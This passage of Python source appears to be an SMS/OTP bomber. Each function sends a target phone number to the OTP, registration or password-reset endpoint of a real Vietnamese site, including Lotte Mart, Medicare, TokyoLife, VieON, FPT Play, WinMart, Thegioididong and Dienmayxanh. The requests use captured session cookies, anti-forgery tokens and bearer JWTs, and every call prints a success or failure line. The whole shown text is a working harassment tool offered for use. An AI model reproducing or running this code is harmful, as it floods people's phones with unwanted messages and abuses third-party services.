        'username': phone,
        'case': 'register',
    }

    try:
        response = requests.post(
            'https://www.lottemart.vn/v1/p/mart/bos/vi_cgy/V1/mart-sms/sendotp',
            cookies=cookies,
            headers=headers,
            json=json_data,
            timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SPEEDLOTTE | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("SPEEDLOTTE | TRẠNG THÁI : Thất Bại Fuck")



def medicare(phone):
    cookies = {
        'SERVER': 'nginx2',
        'XSRF-TOKEN': 'eyJpdiI6Ii9RMTQrNk9RREZvWXF6UkdnTzM5M1E9PSIsInZhbHVlIjoiWmkzTHExeU1tNmFSM1ltczdpWU1Ec1hCZTROSXhzTEJVRDE2NXQ2NmVTR3lMQ1paS3NBSitwRllzVVNUUFB6WG1YNXdXSEJuOE1VZjQ4ZzE2WnBYUFRYVGFNT2NSTUhNYk1tWkhVdTZRa0gyRFVOM2g1WWdOeVFIWUxCMVY0Y2kiLCJtYWMiOiJhMzA4YWEyZTk5ZGEzZmY3ZTZiMTFjMTNhYTk4NzYyZjkxYTAyOWQyNDcyYTIxMGU2NDQ5MjVmNzc5ODgwZmUyIiwidGFnIjoiIn0%3D',
        'medicare_session': 'eyJpdiI6Ii9Ma2NlZmZ1OVZPTDdxeitEOVVNT2c9PSIsInZhbHVlIjoiK0NhYXZtYjRBeHRwd1gvenMrblVGVEdrU0FKVW80bmptYnQvbHMzRzkvN1pyYjVmaEh3ZHdEYzlHb3V3djBvNjMyeTlKdUJzbTl0S2RwQkJwQkh0ejFrcEJXcnZUcGRDTEppdmp1MTJ6UDgzRk4zcUtKalpJVSt1RGhLdjd3OS8iLCJtYWMiOiI4ZjU1ZTZkNjc1NWM5Mjc3NjNkN2UxMTUzNWQ5YzUyYTY4N2I0NTQ1NTZiZWExOWViZjcwYjhmNWUxM2NlYjMyIiwidGFnIjoiIn0%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        # 'Cookie': 'SERVER=nginx2; XSRF-TOKEN=eyJpdiI6Ii9RMTQrNk9RREZvWXF6UkdnTzM5M1E9PSIsInZhbHVlIjoiWmkzTHExeU1tNmFSM1ltczdpWU1Ec1hCZTROSXhzTEJVRDE2NXQ2NmVTR3lMQ1paS3NBSitwRllzVVNUUFB6WG1YNXdXSEJuOE1VZjQ4ZzE2WnBYUFRYVGFNT2NSTUhNYk1tWkhVdTZRa0gyRFVOM2g1WWdOeVFIWUxCMVY0Y2kiLCJtYWMiOiJhMzA4YWEyZTk5ZGEzZmY3ZTZiMTFjMTNhYTk4NzYyZjkxYTAyOWQyNDcyYTIxMGU2NDQ5MjVmNzc5ODgwZmUyIiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6Ii9Ma2NlZmZ1OVZPTDdxeitEOVVNT2c9PSIsInZhbHVlIjoiK0NhYXZtYjRBeHRwd1gvenMrblVGVEdrU0FKVW80bmptYnQvbHMzRzkvN1pyYjVmaEh3ZHdEYzlHb3V3djBvNjMyeTlKdUJzbTl0S2RwQkJwQkh0ejFrcEJXcnZUcGRDTEppdmp1MTJ6UDgzRk4zcUtKalpJVSt1RGhLdjd3OS8iLCJtYWMiOiI4ZjU1ZTZkNjc1NWM5Mjc3NjNkN2UxMTUzNWQ5YzUyYTY4N2I0NTQ1NTZiZWExOWViZjcwYjhmNWUxM2NlYjMyIiwidGFnIjoiIn0%3D',
        'Origin': 'https://medicare.vn',
        'Referer': 'https://medicare.vn/login',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-XSRF-TOKEN': 'eyJpdiI6Ii9RMTQrNk9RREZvWXF6UkdnTzM5M1E9PSIsInZhbHVlIjoiWmkzTHExeU1tNmFSM1ltczdpWU1Ec1hCZTROSXhzTEJVRDE2NXQ2NmVTR3lMQ1paS3NBSitwRllzVVNUUFB6WG1YNXdXSEJuOE1VZjQ4ZzE2WnBYUFRYVGFNT2NSTUhNYk1tWkhVdTZRa0gyRFVOM2g1WWdOeVFIWUxCMVY0Y2kiLCJtYWMiOiJhMzA4YWEyZTk5ZGEzZmY3ZTZiMTFjMTNhYTk4NzYyZjkxYTAyOWQyNDcyYTIxMGU2NDQ5MjVmNzc5ODgwZmUyIiwidGFnIjoiIn0=',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'mobile': phone,
        'mobile_country_prefix': '84',
    }

    try:
        response = requests.post('https://medicare.vn/api/otp', cookies=cookies, headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MEDICARE | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("MEDICARE | TRẠNG THÁI : Thất Bại Fuck")



def tokyolife(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://tokyolife.vn',
        'priority': 'u=1, i',
        'referer': 'https://tokyolife.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'signature': '260a5bdf2a783bc889dcf22852ff0c5e',
        'timestamp': '1721494339686',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone_number': phone,
        'name': 'tran th1nk',
        'password': '123123123a',
        'email': 'ret43ht6@gmail.com',
        'birthday': '2003-10-01',
        'gender': 'male',
    }

    try:
        response = requests.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TOKYOLIFE | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("TOKYOLIFE | TRẠNG THÁI : Thất Bại Fuck")



def vieon(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjE2OTc2NzcsImp0aSI6IjM2YTYxOGU4ZmNlMzlmNzVkZjJhZDk1Mjg5YWE3OTk5IiwiYXVkIjoiIiwiaWF0IjoxNzIxNTI0ODc3LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcyMTUyNDg3Niwic3ViIjoiYW5vbnltb3VzXzI1MjhiYWQ3MWJiYmY5ODg4ODJhYTcyZmRiMTA1Mzg0LWNlM2FjYzc2ODdlNmVjNWRhZGJiN2E1N2YzMWE0YTBkLTE3MjE1MjQ4NzciLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiMjUyOGJhZDcxYmJiZjk4ODg4MmFhNzJmZGIxMDUzODQtY2UzYWNjNzY4N2U2ZWM1ZGFkYmI3YTU3ZjMxYTRhMGQtMTcyMTUyNDg3NyIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNi4wLjAuMCBTYWZhcmkvNTM3LjM2IE9QUi8xMTIuMC4wLjAiLCJkdCI6IndlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiV2luZG93cyAxMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.wXtslFrAOKsPxT41wnkXvzY7K1AocvJykB4eI0jnesY',
        'content-type': 'application/json',
        'origin': 'https://vieon.vn',
        'priority': 'u=1, i',
        'referer': 'https://vieon.vn/auth/?destination=/&page=/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'platform': 'web',
        'ui': '012021',
    }

    json_data = {
        'username': phone,
        'country_code': 'VN',
        'model': 'Windows 10',
        'device_id': '2528bad71bbbf988882aa72fdb105384',
        'device_name': 'Opera/112',
        'device_type': 'desktop',
        'platform': 'web',
        'ui': '012021',
    }

    try:
        response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIEON | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("VIEON | TRẠNG THÁI : Thất Bại Fuck")



def fptreg(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fptplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-did': 'B274C650E1693D1F',
    }

    json_data = {
        'phone': phone,
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    try:
        response = requests.post(
            'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=6j5x6nett8jkCfcK_qAYHg&e=1721803584&device=Opera(version%253A112.0.0.0, timeout=10)&drm=1',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTREG | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("FPTREG | TRẠNG THÁI : Thất Bại Fuck")



def fptreset(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fptplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-did': 'B274C650E1693D1F',
    }

    json_data = {
        'phone': phone,
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    try:
        response = requests.post(
            'https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=oIfVfDi61oLPs9G1htsfEw&e=1721803775&device=Opera(version%253A112.0.0.0, timeout=10)&drm=1',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTRESET | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("FPTRESET | TRẠNG THÁI : Thất Bại Fuck")



def fptresend(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fptplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-did': 'B274C650E1693D1F',
    }

    json_data = {
        'phone': phone,
        'email': '',
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    try:
        response = requests.post(
            'https://api.fptplay.net/api/v7.1_w/user/otp/resend_otp?st=f8BaG8rdfwZq825-0vCokg&e=1721803855&device=Opera(version%253A112.0.0.0, timeout=10)&drm=1',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTRESEND | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("FPTRESEND | TRẠNG THÁI : Thất Bại Fuck")



def winmart(phone):
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'origin': 'https://winmart.vn',
        'priority': 'u=1, i',
        'referer': 'https://winmart.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-api-merchant': 'WCM',
    }

    json_data = {
        'firstName': 'tran tranh',
        'phoneNumber': phone,
        'masanReferralCode': '',
        'dobDate': '1996-07-12',
        'gender': 'Male',
    }

    try:
        response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("WINMART | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("WINMART | TRẠNG THÁI : Thất Bại Fuck")



def tgdidong(phone):
    cookies = {
        '_ga': 'GA1.1.383137769.1707219496',
        '_pk_id.7.8f7e': '98ddc5d43340bec9.1707219498.',
        '_tt_enable_cookie': '1',
        '_ttp': 'lc7jJkDQUTphqZNKGUgbp4UXsVT',
        'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
        '_gcl_au': '1.1.1960895612.1715007168',
        '_ce.s': 'v~06f7993d465cd9643255ae47331c104ea2a8f43f~lcw~1716365214445~lva~1710611539005~vpv~2~v11.cs~127806~v11.s~5e8eeb30-1811-11ef-9635-b97827c5d2c2~v11.send~1716364882755~v11.sla~1716365214560~lcw~1716365214560',
        '___utmvm': '###########',
        'ASP.NET_SessionId': 'kkussnf30znrftqduwbdzoaz',
        '_fbp': 'fb.1.1719755336237.751784073551657802',
        '_pk_ref.7.8f7e': '%5B%22%22%2C%22%22%2C1719755337%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '__zi': '3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJcp-VghMOJncQFv-ejTT96fbqdw-yqKqSc30n.1',
        '_ga_TLRZMSX5ME': 'GS1.1.1719755335.46.1.1719755823.59.0.0',
        '__RequestVerificationToken_L2dhbWUtYXBw0': 'rzKrwattPlE5aIeSUH_Ba4w259rIIze-LaaclUjNHcNQCji0VgT0zNQ7Zq8cFI4eQk0jHQnWOf7y7onaJEjp-wPVuKs1',
        'TBMCookie_3209819802479625248': '704213001721527337Hu28LknIyBN3jECb5nTjLkwFuDU=',
        '.AspNetCore.Antiforgery.Pr58635MgNE': 'CfDJ8AFHr2lS7PNCsmzvEMPceBNpSdfUfuzn0Tk0qaOME94sn78vfGeyjelReu51zW1TBbsCoJH4dKRyyvQ7UzcC3wV8QVT81_RgQqGnWVsuuUDAD2OMWHK_g60DtIbnThCaeFM0aJqujknPABfHc5N4BS8',
        'SvID': 'beline2682|Zpxsx|ZpxsL',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': '_ga=GA1.1.383137769.1707219496; _pk_id.7.8f7e=98ddc5d43340bec9.1707219498.; _tt_enable_cookie=1; _ttp=lc7jJkDQUTphqZNKGUgbp4UXsVT; DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; _gcl_au=1.1.1960895612.1715007168; _ce.s=v~06f7993d465cd9643255ae47331c104ea2a8f43f~lcw~1716365214445~lva~1710611539005~vpv~2~v11.cs~127806~v11.s~5e8eeb30-1811-11ef-9635-b97827c5d2c2~v11.send~1716364882755~v11.sla~1716365214560~lcw~1716365214560; ___utmvm=###########; ASP.NET_SessionId=kkussnf30znrftqduwbdzoaz; _fbp=fb.1.1719755336237.751784073551657802; _pk_ref.7.8f7e=%5B%22%22%2C%22%22%2C1719755337%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; __zi=3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJcp-VghMOJncQFv-ejTT96fbqdw-yqKqSc30n.1; _ga_TLRZMSX5ME=GS1.1.1719755335.46.1.1719755823.59.0.0; __RequestVerificationToken_L2dhbWUtYXBw0=rzKrwattPlE5aIeSUH_Ba4w259rIIze-LaaclUjNHcNQCji0VgT0zNQ7Zq8cFI4eQk0jHQnWOf7y7onaJEjp-wPVuKs1; TBMCookie_3209819802479625248=704213001721527337Hu28LknIyBN3jECb5nTjLkwFuDU=; .AspNetCore.Antiforgery.Pr58635MgNE=CfDJ8AFHr2lS7PNCsmzvEMPceBNpSdfUfuzn0Tk0qaOME94sn78vfGeyjelReu51zW1TBbsCoJH4dKRyyvQ7UzcC3wV8QVT81_RgQqGnWVsuuUDAD2OMWHK_g60DtIbnThCaeFM0aJqujknPABfHc5N4BS8; SvID=beline2682|Zpxsx|ZpxsL',
        'Origin': 'https://www.thegioididong.com',
        'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': phone,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8AFHr2lS7PNCsmzvEMPceBNmcyxqfG4iox8M-NAgV5Q8ffXIQLpqWRkUg7FNMCcXbDGttXTUOUmdIpQ_KvOdMghelaFFw19tC0tdNruWUKkJSdyIXgff-CzqyfSx-6wOmYxTRqCMnxQsHfxdy9qova8',
    }

    try:
        response = requests.post(
            'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            cookies=cookies,
            headers=headers,
            data=data,
            timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TGDIDONG | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("TGDIDONG | TRẠNG THÁI : Thất Bại Fuck")



def dienmayxanh(phone):
    cookies = {
        '_ga': 'GA1.1.939547831.1707797103',
        '_pk_id.8.8977': 'e802b602f6107cf3.1707797103.',
        '__zi': '3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareFm7kFkUlPMm_0UO_sxTfOHC1-Xl3ft5b5n0.1',
        '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1715006306%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '_ga_Y7SWKJEHCE': 'GS1.1.1715006306.6.1.1715006470.35.0.0',
        '_ce.s': 'v~ff26ccac15be51f1102509bcedf9db29bdf23777~lcw~1715006470671~lva~1711640411478~vpv~1~v11.cs~218102~v11.s~4d054880-0bb6-11ef-bfef-dd812afaeae2~v11.sla~1715006470671~gtrk.la~lvv2klxr~v11.send~1715006470666~lcw~1715006470672',
        'DMX_View': 'DESKTOP',
        'DMX_Personal': '%7b%22UID%22%3anull%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3afalse%7d',
        '___utmvm': '###########',
        'TBMCookie_3209819802479625248': '776601001721528393bXxgBsRABGmtGgaJgAFdbO3dR0A=',
        '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dtrue,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
        'SvID': 'new2693|ZpxwU|ZpxwT',
        '.AspNetCore.Antiforgery.SuBGfRYNAsQ': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5TlW1yu94AbLY9Foj1ATcGLAtFG438KORcw1uifchTktISZlzc3jkSEVDilhPCQZ77srpJ8LiRF_P_Jijxc7NssGtaQvcZNo5shOUPZKGaElFMjm9rBI6-cQGKiaSv1aSU',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': "_ga=GA1.1.939547831.1707797103; _pk_id.8.8977=e802b602f6107cf3.1707797103.; __zi=3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareFm7kFkUlPMm_0UO_sxTfOHC1-Xl3ft5b5n0.1; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1715006306%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _ga_Y7SWKJEHCE=GS1.1.1715006306.6.1.1715006470.35.0.0; _ce.s=v~ff26ccac15be51f1102509bcedf9db29bdf23777~lcw~1715006470671~lva~1711640411478~vpv~1~v11.cs~218102~v11.s~4d054880-0bb6-11ef-bfef-dd812afaeae2~v11.sla~1715006470671~gtrk.la~lvv2klxr~v11.send~1715006470666~lcw~1715006470672; DMX_View=DESKTOP; DMX_Personal=%7b%22UID%22%3anull%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3afalse%7d; ___utmvm=###########; TBMCookie_3209819802479625248=776601001721528393bXxgBsRABGmtGgaJgAFdbO3dR0A=; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dtrue,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; SvID=new2693|ZpxwU|ZpxwT; .AspNetCore.Antiforgery.SuBGfRYNAsQ=CfDJ8LmkDaXB2QlCm0k7EtaCd5TlW1yu94AbLY9Foj1ATcGLAtFG438KORcw1uifchTktISZlzc3jkSEVDilhPCQZ77srpJ8LiRF_P_Jijxc7NssGtaQvcZNo5shOUPZKGaElFMjm9rBI6-cQGKiaSv1aSU",
        'Origin': 'https://www.dienmayxanh.com',
        'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': phone,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5TT5ZU_rJVhy8x3F_L2DiqjDc1L_VRbJiGtF6nRoVvDLPby5ttmADmlIwjASFbRoQXmnFIpyCwkWErImoHvqHc6D1Vb9shU3Z3n67mDZCKqSmU5PWGqoH6wMh-UqswE9EQ',
    }

    try:
        response = requests.post(
            'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            cookies=cookies,
            headers=headers,
            data=data,
            timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("DIENMAYXANH | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
